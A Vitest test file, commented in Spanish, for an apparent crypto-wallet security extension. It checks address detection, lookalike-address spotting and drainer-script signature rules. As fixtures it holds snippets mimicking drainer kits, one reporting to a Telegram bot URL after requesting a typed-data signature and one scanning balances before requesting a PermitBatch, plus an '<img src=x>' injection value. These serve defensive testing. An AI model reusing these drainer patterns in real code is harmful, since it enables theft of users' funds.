import { describe, expect, it } from 'vitest';
import { findAddresses, isLookalike, sameAddress } from '../../shared/addresses';
import { matchRules } from '../../shared/scripts/signatures';
import { containsSensitiveRpc, parseMainToIso } from '../../shared/bridge';
import { parseClipMessage, parseFirewallEvent } from '../../shared/messages';
import { analyzeRequest } from '../../shared/evm';

describe('direcciones en texto', () => {
  it('encuentra EVM, Bitcoin y Solana', () => {
    const t = 'Envía a 0x52908400098527886E0F7030069857D2E4169EE7 o bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq o 7EcDhSYGxXyscszYEp35KHN8vvw3svAuLKTzXwCFLtV para Solana.';
    const f = findAddresses(t);
    expect(f.map((x) => x.kind)).toEqual(['evm', 'btc', 'solana']);
  });
  it('no confunde texto normal con direcciones', () => {
    expect(findAddresses('Bienvenido a la documentación de WalletShield, versión 2026.')).toEqual([]);
  });
  it('detecta direcciones "parecidas" (address poisoning)', () => {
    const real = '0x52908400098527886E0F7030069857D2E4169EE7';
    const fake = '0x529084a1b2c3d4e5f6a7b8c9d0e1f2a3b4169EE7';
    expect(isLookalike(real, fake)).toBe(true);
    expect(isLookalike(real, real.toLowerCase())).toBe(false);
    expect(isLookalike(real, '0x1111111111111111111111111111111111111111')).toBe(false);
    expect(sameAddress(real, real.toLowerCase())).toBe(true);
  });
});

describe('firmas de scripts de drainers', () => {
  it('kit que reporta a Telegram y pide firmas → alto', () => {
    const code = `const BOT="https://api.telegram.org/bot61234:AAH/sendMessage";async function go(){await ethereum.request({method:"eth_signTypedData_v4",params:[a,d]});fetch(BOT)}`;
    expect(matchRules(code, null).map((h) => h.id)).toContain('telegram-exfil');
  });
  it('kit que escanea activos y pide PermitBatch → alto', () => {
    const code = `fetch("https://rpc.ankr.com/multichain",{body:JSON.stringify({method:"ankr_getAccountBalance"})});const t={primaryType:"PermitBatch"};ethereum.request({method:"eth_signTypedData_v4"})`;
    expect(matchRules(code, null).map((h) => h.id)).toContain('asset-scan-and-drain');
  });
  it('bundle tipo Uniswap (usa Permit2 y setApprovalForAll, pero sin exfiltración ni escaneo de terceros) → limpio', () => {
    const code = `const PERMIT2="0x000000000022D473030F116dDEE9F6B43aC78BA3";function sign(){return provider.request({method:"eth_signTypedData_v4"})}function nft(){return c.setApprovalForAll(op,true)}fetch("https://interface.gateway.uniswap.org/v2/quote")`;
    expect(matchRules(code, null)).toEqual([]);
  });
  it('hash exacto', () => {
    expect(matchRules('x', 'aa', [{ id: 'k', risk: 'high', text: 't', sha256: ['aa'] }]).length).toBe(1);
    expect(matchRules('x', null, [{ id: 'k', risk: 'high', text: 't', sha256: ['aa'] }]).length).toBe(0);
  });
});

describe('protocolo y mensajes de fase 4', () => {
  it('detecta payloads JSON-RPC sensibles anidados (canal interno de MetaMask)', () => {
    const msg = { target: 'metamask-contentscript', data: { name: 'metamask-provider', data: { id: 1, jsonrpc: '2.0', method: 'eth_sign', params: [] } } };
    expect(containsSensitiveRpc(msg)).toBe('eth_sign');
    expect(containsSensitiveRpc({ data: { method: 'eth_chainId' } })).toBeNull();
    expect(containsSensitiveRpc('eth_sign')).toBeNull();
  });
  it('valida mensajes de amenaza', () => {
    expect(parseMainToIso({ t: 'threat', kind: 'provider-overwrite', detail: 'x' })).toEqual({ t: 'threat', kind: 'provider-overwrite', detail: 'x' });
    expect(parseMainToIso({ t: 'threat', kind: 'otra-cosa', detail: 'x' })).toBeNull();
    expect(parseMainToIso({ t: 'used' })).toEqual({ t: 'used' });
    expect(parseFirewallEvent({ type: 'fw:event', kind: 'fw-threat', method: 'x', risk: 'high', host: 'a.com', codes: [] })?.kind).toBe('fw-threat');
  });
  it('mensajes de portapapeles validados', () => {
    expect(parseClipMessage({ type: 'clip:copy', address: '0x52908400098527886E0F7030069857D2E4169EE7' })?.type).toBe('clip:copy');
    expect(parseClipMessage({ type: 'clip:copy', address: '<img src=x>' })).toBeNull();
    expect(parseClipMessage({ type: 'clip:get' })).toEqual({ type: 'clip:get' });
  });
});

describe('amenazas de la página elevan el riesgo de cualquier firma', () => {
  const base = { chainId: 1, account: null, pageHost: 'x.com', siteRisk: 'none' as const, now: Date.now(), badAddresses: new Set<string>(), answers: new Map() };
  it('texto inocuo en una página con script de drainer → alto', () => {
    const msg = '0x' + Buffer.from('Login').toString('hex');
    expect(analyzeRequest('personal_sign', [msg, '0x1111111111111111111111111111111111111111'], base).risk).toBe('low');
    const a = analyzeRequest('personal_sign', [msg, '0x1111111111111111111111111111111111111111'], { ...base, pageThreats: [{ risk: 'high', text: 'reemplazó el provider.' }] });
    expect(a.risk).toBe('high');
    expect(a.findings.map((f) => f.code)).toContain('malicious-script');
  });
});
